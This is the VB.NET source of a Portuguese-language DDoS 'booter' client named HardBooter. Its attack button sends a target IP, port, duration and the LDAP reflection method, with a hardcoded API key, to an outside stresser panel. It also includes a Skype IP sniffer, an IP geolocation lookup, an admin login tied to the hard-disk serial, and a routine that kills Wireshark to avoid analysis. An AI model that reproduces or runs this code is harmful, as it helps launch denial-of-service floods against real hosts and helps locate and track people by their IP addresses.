Imports System.Net
Imports System.Management

Public Class Booter
    Private intconta As Integer = 0
    Friend Shared DIES As Integer

    Private Sub Booter_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        BemV.Text = "~ Seja Bem Vindo(a) Ao HardBooter " + Login.Usuarioo.Text + " ~"
        Logado.Text = "~ Logado como:  " + Login.Usuarioo.Text + " ~"
        DiasVIP.Text = "Dias VIP Restantes: " + Login.DiasVIP
        DiasVIP.Text = DiasVIP.Text.Replace("<br />", vbNullString)
    End Sub

    Private Sub BoosterRedButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Fechar.Click
        End
    End Sub

    Private Sub Minimizar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Minimizar.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Label4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label4.Click

    End Sub

    Private Sub BossterMixedButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Atacar.Click
        If IP.Text = "0.0.0.0" Or IP.Text = "127.0.0.1" Or IP.Text = "localhost" Or Tempo.Text = "0" Then
            Comando.Text = "ERRO, Verifique se você está tentando pacotar o IP da sua localhost ou colocou time 0."
        Else
            WebBrowser1.Navigate("https://api.lightboot.org/panel/index.php?page=Api&key=b6udeJ2WqDoyHKzzsEjfG3QajboCjeJv&host=" + IP.Text + "&port=" + PORTA.Text + "&time=" + Tempo.Text + "&method=LDAP")
            Atacar.Visible = False
            PararAtaque.Visible = True
            taimi.Enabled = False
            IP.Enabled = False
            PORTA.Enabled = False
            LogInComboBox1.Enabled = False
            DiminuirTrackBar.Start()
            Comando.Text = "Ataque lançado no IP " + IP.Text + " utilizando a porta " + PORTA.Text + " no método " + LogInComboBox1.Text + " por " + Tempo.Text + " segundos!"
        End If
    End Sub

    Private Sub Tempo_Ataque_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Tempo_Ataque.Tick
        Tempo.Text = taimi.Value
    End Sub

    Private Sub Auto_Stop_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DiminuirTrackBar.Tick
        If Tempo.Text = "0" Then
            Atacar.Visible = True
            PararAtaque.Visible = False
            taimi.Enabled = True
            IP.Enabled = True
            PORTA.Enabled = True
            LogInComboBox1.Enabled = True
            DiminuirTrackBar.Stop()
        Else
            taimi.Value -= 1
        End If
    End Sub

    Private Sub BossterMixedButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BossterMixedButton3.Click
        Shell("ping -t " + IP.Text, AppWinStyle.NormalFocus)
        Comando.Text = "Ping disparado no IP " + IP.Text + "!"
    End Sub

    Private Sub BoosterButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BoosterButton1.Click
        WebRequest.Create("API AQUI" + Ipgeo.Text)
        geoinfo.Text = New WebClient().DownloadString("API AQUI" + Ipgeo.Text)
        Comando.Text = "IP " + Ipgeo.Text + " localizado com sucesso!"
    End Sub

    Private Sub Color_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Color.Tick
        If intconta > 3 Then
            intconta = 0
        End If
        If intconta = 0 Then
            geoinfo.ForeColor = Drawing.Color.Green
            listResolverIP.ForeColor = Drawing.Color.Green
        ElseIf intconta = 1 Then
            geoinfo.ForeColor = Drawing.Color.Blue
            listResolverIP.ForeColor = Drawing.Color.Blue
        ElseIf intconta = 2 Then
            geoinfo.ForeColor = Drawing.Color.Yellow
            listResolverIP.ForeColor = Drawing.Color.Yellow
        ElseIf intconta = 3 Then
            geoinfo.ForeColor = Drawing.Color.DarkRed
            listResolverIP.ForeColor = Drawing.Color.DarkRed
        End If
        intconta += 1
    End Sub

    Private Sub BoosterButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BoosterButton2.Click
        Clipboard.SetDataObject(geoinfo.Text, True)
        Comando.Text = "Informações do IP " + Ipgeo.Text + " copiadas com sucesso!"
    End Sub

    Private Sub BossterMixedButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BossterMixedButton2.Click
        LogInTabControl1.SelectedTab = TabPage4
        Ipgeo.Text = IP.Text
        WebRequest.Create("API AQUI" + Ipgeo.Text)
        geoinfo.Text = New WebClient().DownloadString("API AQUI" + Ipgeo.Text)
        Comando.Text = "IP " + Ipgeo.Text + " localizado com sucesso!"
    End Sub

    Private Sub TabPage3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TabPage3.Click

    End Sub

    Private Sub btnArchStart_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnArchStart.Click
        Try
            For i = 0 To SkypeArch.ALL_CONNECTIONS(cbArchMethod.SelectedIndex).GetIPProperties.UnicastAddresses.Count - 1
                If SkypeArch.ALL_CONNECTIONS(cbArchMethod.SelectedIndex).GetIPProperties.UnicastAddresses(i).Address.AddressFamily = Net.Sockets.AddressFamily.InterNetwork Then
                    SkypeArch.MY_IP = SkypeArch.ALL_CONNECTIONS(cbArchMethod.SelectedIndex).GetIPProperties.UnicastAddresses(i).Address
                End If
            Next
            Comando.Text = "Sniffer iniciado!"
            btnArchStop.Visible = True
            btnArchStart.Visible = False
            btnArchStop.Enabled = True
            btnArchStart.Enabled = True
        Catch ex As Exception
            Comando.Text = "Erro ao iniciar o sniffer!"
        End Try
        SkypeArch.STARTED = True
        SkypeArch.BindSocket()
        listResolverIP.Text = "Endereço IP: " + String.Empty
    End Sub

    Private Sub btnArchStop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnArchStop.Click
        SkypeArch.STARTED = False
        Comando.Text = "Sniffer parado!"
        btnArchStop.Visible = False
        btnArchStart.Visible = True
        btnArchStop.Enabled = False
        btnArchStart.Enabled = True
    End Sub

    Private Sub cbArchMethod_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbArchMethod.Click
        cbArchMethod.Items.Clear()
        SkypeArch.ALL_CONNECTIONS = Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces

        For i = 0 To SkypeArch.ALL_CONNECTIONS.Length - 1
            cbArchMethod.Items.Add(SkypeArch.ALL_CONNECTIONS(i).Name)
        Next
    End Sub

    Private Sub xChat_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles xChat.Tick
        Try
            chaty.Text = Chat.Document.Body.InnerText
            ChatB.RunWorkerAsync()
        Catch ex As Exception
        End Try
        chaty.SelectionStart = chaty.Text.Length
        chaty.ScrollToCaret()
    End Sub

    Private Sub BoosterRedButton1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BoosterRedButton1.Click
        Dim WClient As New System.Net.WebClient
        WClient.DownloadString("API AQUI" & Login.Usuarioo.Text & "&text=" & Me.Mensagem.Text)
        Mensagem.Text = ""
        Comando.Text = "Mensagem enviada com sucesso!"
    End Sub

    Private Sub listResolverIP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles listResolverIP.Click
        Clipboard.SetDataObject(listResolverIP.Text, True)
        Comando.Text = "Endereço IP do skype sniffer copiado com sucesso!"
    End Sub

    Private Sub BoosterButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BoosterButton4.Click
        Dim WAccount As New System.Net.WebClient
        WAccount.DownloadString("API AQUI" + logCreate.Text + "&passw=" + logCreatePass.Text)
        Comando.Text = "Conta criada com sucesso!"
    End Sub
    Function GetHDSerial() As String
        Dim strHDSerial As String = String.Empty
        Dim index As Integer = 0
        Dim Data As String
        Dim query As New SelectQuery("Win32_DiskDrive")
        Dim search As New ManagementObjectSearcher(query)
        Dim info As ManagementObject
        Try
            For Each info In search.Get()
                Data = info("SerialNumber")
                If Data.Contains(" ") Then
                    Return Data.Replace(" ", "")
                Else
                    Return Data
                End If
            Next
        Catch ex As Exception
            strHDSerial = "Error67"
        End Try
    End Function

    Dim GoAcesss As New WebClient
    Dim LinkServidor As String = "DATABASE AQUI"
    Public HDVIP As String
    Private Sub BoosterButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles logAdminButton.Click
        Dim Resposta As String =
GoAcesss.DownloadString(LinkServidor & "APIAQUI.php?&user=" &
logAdmin.Text & "&pass=" & passAdmin.Text & "&hdi=" & AES_Encrypt(GetHDSerial(), 338))
        respostaadmin.Text = Resposta
        If Resposta.Contains("fuckinhoksgy") Then
            Dim Parte As Array
            Parte = Resposta.Split("|")
            If AES_Encrypt(GetHDSerial(), 338) = Parte(1).ToString.Replace(" ", "+") Then
                HDVIP = Parte(1)
                Comando.Text = "Você logou-se com sucesso no painel admin!"
                Label10.Text = "~ Painel admininstrativo do HardBooter, Seja bem-vindo " + logAdmin.Text + "! ~"
                AdminPanel.Visible = True
                AdminPanel.Enabled = True
            Else
                Comando.Text = "Esta conta Admin não foi registrada no seu computador!"
                Comando.ForeColor = Drawing.Color.Red
            End If
        End If
    End Sub

    Private Sub ChatB_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles ChatB.DoWork
        Chat.Refresh()
    End Sub

    Private Sub PararAtaque_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PararAtaque.Click
        Comando.Text = "Função stop offline temporariamente, Não estamos com maquinas próprias..."
    End Sub

    Private Sub BoosterButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BoosterButton5.Click
        WebBrowser1.Navigate("API AQUI")
        WebBrowser2.Navigate("API AQUI")
        WebBrowser3.Navigate("API AQUI")
        Comando.Text = "Todos os ataques que estavam rodando no booter foram finalizados!"
    End Sub

    Private Sub KillSniffing_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillSniffing.Tick
        For Each process As Process In process.GetProcessesByName("wireshark")
            process.Kill()
            End
        Next
    End Sub
End Class